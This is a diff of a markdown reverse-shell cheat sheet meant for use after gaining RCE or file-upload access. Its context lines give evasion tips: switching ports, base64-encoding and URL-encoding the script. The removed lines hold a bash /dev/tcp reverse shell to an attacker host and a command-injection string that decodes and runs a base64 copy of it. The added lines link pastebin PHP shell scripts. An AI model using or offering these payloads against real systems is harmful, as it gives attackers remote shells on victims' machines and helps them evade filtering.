@@ -6,15 +6,16 @@ If you have obtained a vulnerability such as RCE, file upload or something else,
 2. Try changing the port to a larger one such as 8080, 8888, etc. 
 3. Encode your script using base64 and then decode it 
 4. Encode your script using url encode 
+5. Check the compiler 
 
-## Script 1 
+## Php spawning cmd 
 
+```Windows
+https://pastebin.com/bFqVuGwv
 ```
-sh -i >& /dev/tcp/<YOUR HOST OR IP>/<PORT> 0>&1
-```
 
-## Script 2
+## Php spawning bash 
 
-```
-; echo c2ggLWkgPiYgL2Rldi90Y3AvPFlPVVIgSE9TVCBPUiBJUD4vPFBPUlQ+IDA+JjE= | base64 -d | bash;"
+```Linux
+https://pastebin.com/QsSKm2F1
 ```
